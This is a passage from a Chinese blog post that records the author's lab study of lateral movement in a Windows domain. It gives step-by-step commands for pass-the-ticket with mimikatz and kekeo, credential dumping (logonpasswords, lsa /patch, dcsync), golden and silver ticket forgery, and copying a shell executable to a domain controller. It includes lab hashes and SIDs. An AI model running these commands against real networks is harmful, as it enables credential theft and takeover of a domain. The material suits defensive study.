<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934142c29d.png" alt="image-20241002200503026"></p>
<p>-u：用户和域名</p>
<p>-s：这个用户对应的sid值</p>
<p>-d：域控对应内网id</p>
<p>-p：用户对应密码</p>
<p>可以看到已经生成了一个TGT</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340d89888.png" alt="image-20241002200658162"></p>
<p>查看一下当前票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340dc82aa.png" alt="image-20241002200833003"></p>
<p>现在是没有的</p>
<p>好 先把我们本地生成的TGT传到我们已控制的主机上来 这里是webserver</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934118dae9.png" alt="image-20241002201139741"></p>
<p>但是现在的票据还只是在主机的文件夹里</p>
<p>我们通过mimikatz导入TGT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT文件名</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340db47bc.png" alt="image-20241002201606144"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340ef1e18.png" alt="image-20241002201625291"></p>
<p>好 这样的话就注入成功了</p>
<p>klist看下票据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340e11654.png" alt="image-20241002201719834"></p>
<p>已经有了新票据</p>
<p>读一下域控c盘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\OWA2010CN-GOD\c$</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340de316c.png" alt="image-20241002202108977"></p>
<p>访问成功</p>
<p>清空票据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340de1412.png" alt="image-20241002202251074"></p>
<p>但是DC域控如果打过对应的漏洞补丁，那这种方法就不行了</p>
<p>拿下域控就好说了</p>
<p>可以直接copy命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy shell.exe \\OWA2010CN-GOD\c$</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340f7bc3a.png" alt="image-20241002203417802"></p>
<p>过来了</p>
<h3 id="KEKEO"><a href="#KEKEO" class="headerlink" title="KEKEO"></a>KEKEO</h3><p>要求：<strong>高权限</strong>  </p>
<p>原理：因为当前主机在以前的时间内肯定会和其他主机产生过连接，所以本地应该就生成了一些票据，我们可以导出这些票据，然后再导入这些票据进行利用</p>
<p>缺点：票据是有有效期的，如果在有效期内连接过域控的话，就可以使用这些票据</p>
<p>首先我们先把kekeo这个工具传到我们控制的webserver上</p>
<p>导出票据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>kekeo和mimikatz都会进入到工具里面 然后再输入命令 执行 </p>
<p>所以这里我们直接加一个exit 让他执行完命令后退出</p>
<p>这个NTLM哈希就是这个administrator在GOD域内的hash</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340eea1db.png" alt="image-20241002204250442"></p>
<p>执行成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934114a90f.png" alt="image-20241002204345364"></p>
<p>可以看到在webserver的桌面上多了两个票据文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340d9bd90.png" alt="image-20241002204433553"></p>
<p>导入这个administrator的票据</p>
<p>这里我们还是使用这个kekeo来</p>
<p>导入票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>当然你用mimikatz也是一样的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934114a90f.png" alt="image-20241002204817138"></p>
<p>可以看到 成功</p>
<p>klist也有票了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340f881b2.png" alt="image-20241002204915621"></p>
<p>有票了</p>
<p>那么访问也是没有问题的了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340d8bbc0.png" alt="image-20241002204949543"></p>
<p>只要我们抓到一张域控administator的票 那么域内所有主机都可以通过这个票访问到DC</p>
<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz同样可以抓到历史票据</p>
<p>但是不知道票据是否过期(10h)</p>
<p>导出票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p>导入票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;3e4]-0-0-40a40000-WEBSERVER$@cifs-owa2010cn-god.god.org.kirbi</span><br></pre></td></tr></table></figure>

<p>其他的一样了</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>实际上黄金票据和白银票据都是在权限维持里</p>
<p>黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</p>
<p>且黄金票据不会受到TGT生命周期的影响（默认10小时，最长续订一周）</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>拿到域控  适合做权限维持</li>
<li>有krbtgt用户(这是一个域控用户)的hash值(aeshash ntmlhash等 后面要指定一下算法)</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先拿到我们需要的域内信息</p>
<h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>这个随便获取 就不多说了</p>
<h4 id="域的SID值"><a href="#域的SID值" class="headerlink" title="域的SID值"></a>域的SID值</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340de31fc.png" alt="image-20241009104508236"></p>
<p><strong>注意 这个SID最后面这个-500表示的是这个用户 所以域的SID值 要把-500去掉</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/all</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934139f049.png" alt="image-20241009104724113"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093412c16a9.png" alt="image-20241009104811055"></p>
<p>三种方法都可以</p>
<p>包括cs插件 都可以</p>
<h4 id="域的KRBTGT账户hash"><a href="#域的KRBTGT账户hash" class="headerlink" title="域的KRBTGT账户hash"></a>域的KRBTGT账户hash</h4><p>mimikatz直接抓密码</p>
<p>先开权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340dbd4ed.png" alt="image-20241009105310851"></p>
<p>然后就可以抓hash了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /patch</span><br></pre></td></tr></table></figure>

<p>找到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340e0aa11.png" alt="image-20241009105528944"></p>
<p>b097d7ed97495408e1537f706c357fc5</p>
<p>还可以指定查krbtgt用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934118de79.png" alt="image-20241009105803897"></p>
<h4 id="伪造用户"><a href="#伪造用户" class="headerlink" title="伪造用户"></a>伪造用户</h4><p>我们可以伪造域内任意用户 除了krbtgt</p>
<p>看下域内用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934110cd44.png" alt="image-20241009105955011"></p>
<p>比如说 这里我们伪造一下webadmin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:需要伪造的用户 /domain:域名 /sid:域sid /krbtgt:krbtgt用户的ntlm哈希 /ticket:生成的票据名称</span><br></pre></td></tr></table></figure>

<p>好</p>
<p>我们生成票据是不需要高权限的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:404.kirbi</span><br></pre></td></tr></table></figure>

<p>这个.kirbi是票据的默认后缀 加不加无所谓</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340dcec39.png" alt="image-20241009110357646"></p>
<p>生成成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934101a8a7.png" alt="image-20241009110418147"></p>
<h4 id="导入票据"><a href="#导入票据" class="headerlink" title="导入票据"></a>导入票据</h4><p>用mimikatz导入票据即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptt 404.kirbi</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340e5e5cb.png" alt="image-20241009110642513"></p>
<p>webadmin访问域控成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670934135bede.png" alt="image-20241009110714898"></p>
<p>cs本身也可以生成黄金票据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340ee6c4e.png" alt="image-20241009111131361"></p>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>黄金票据是伪造TGT（门票发放票），而<strong>白银票据则是伪造ST</strong>（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>拿下域控</li>
</ul>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="域名-1"><a href="#域名-1" class="headerlink" title="域名"></a>域名</h4><p>同样的 就不多说了</p>
<h4 id="域SID"><a href="#域SID" class="headerlink" title="域SID"></a>域SID</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br><span class="line">whoami/all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>三个命令都可以</p>
<h4 id="目标服务器FQDN"><a href="#目标服务器FQDN" class="headerlink" title="目标服务器FQDN"></a>目标服务器FQDN</h4><p>就是目标计算机的全名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340f81031.png" alt="image-20241009113002960"></p>
<p><strong>注意 计算机名是计算机名 计算机全名是计算机全名</strong></p>
<h4 id="可利用的服务"><a href="#可利用的服务" class="headerlink" title="可利用的服务"></a>可利用的服务</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093411d7123.png" alt="image-20241009113143825"></p>
<p>根据这个图来</p>
<p>比如说CIFS(磁盘共享服务)</p>
<p>这个一般都是开着的</p>
<h4 id="抓服务账号hash"><a href="#抓服务账号hash" class="headerlink" title="抓服务账号hash"></a>抓服务账号hash</h4><p>还是mimikatzs就行</p>
<p>开debug</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br></pre></td></tr></table></figure>

<p>抓hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340e0b9cc.png" alt="image-20241009113605453"></p>
<p>我们需要的域内账户 名字是带有$的 </p>
<p><strong>需要的是指定机器的NTLM hash 通常情况下，本地机器的名后面会带有一个<code>$</code></strong></p>
<h4 id="伪造用户-1"><a href="#伪造用户-1" class="headerlink" title="伪造用户"></a>伪造用户</h4><p>同样是伪造任意用户</p>
<p>这里我们还是伪造webadmin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标计算机全名 /rc4:服务账号的NTML HASH /service:可利用的服务 /user:要伪造的用户 /ptt</span><br></pre></td></tr></table></figure>

<p>这里的&#x2F;ptt就是生成了票据后自动导入 </p>
<p>我们也可以用黄金票据那个 指定名字 生成在本地 再自己导入</p>
<p><strong>但是白银票据是收到票据周期的影响的</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:OWA2010CN-God.god.org /rc4:a3a8b24a2de322c7de77f7471e9e34d6 /service:cifs /user:webadmin /ptt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340de9ce6.png" alt="image-20241009114320589"></p>
<p>可以看到票已经过来了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340f4785e.png" alt="image-20241009114356041"></p>
<p>成功访问到域控</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/6709340e0e4fa.png" alt="image-20241009114417849"></p>
<h3 id="黄金票据与白银票据区别"><a href="#黄金票据与白银票据区别" class="headerlink" title="黄金票据与白银票据区别"></a>黄金票据与白银票据区别</h3><p>获取的权限不同</p>
<ul>
<li>黄金票据：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么<strong>该票据是针对所有机器的所有服务</strong>。</li>
<li>白银票据：实际就是在抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,<strong>只能访问指定的target机器中指定的服务</strong>。</li>
</ul>
<p>认证流程不同</p>
<ul>
<li><p>黄金：同KDC交互，但不同AS交互</p>
</li>
<li><p>白银：不同KDC交互，直接访问Sever</p>
</li>
</ul>
<p>加密方式不同</p>
<ul>
<li><p>黄金：由krbtgt  NTLM HASH 加密</p>
</li>
<li><p>白银：由服务账号 NTLM HASH加密</p>
</li>
</ul>
<p>域委派攻击</p>
<p><a target="_blank" rel="noopener" href="https://github.com/coco413/SecMind">好项目</a></p>
<p>整个内网学下来 还是挺会的 但又不是那么会 而且肯定不会太符合红队的无感渗透 很多情况下都会用到工具 线程也太大了 而且这个横向移动没有权限提升和权限维持学的深刻 有些地方没有深入的学 就比如说kerberos协议啊这种 更多的偏向是使用工具怎么打</p>
<p>后续还会补充学习这边</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/')">横向移动</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=横向移动&amp;url=http://cszvvds.cc/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>学习<span class="tagsPageCount">26</span></a><a class="post-meta__box__tags" href="/tags/%E5%86%85%E7%BD%91/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>内网<span class="tagsPageCount">15</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透<span class="tagsPageCount">15</span></a><a class="post-meta__box__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>横向移动<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java内存马</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/11/DC%E9%9D%B6%E5%9C%BA/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC靶场</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/10/11/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/" title="内网基础"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-11</div><div class="title">内网基础</div></div></a></div><div><a href="/2024/10/11/Cobalt-Strike/" title="Cobalt-Strike"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content 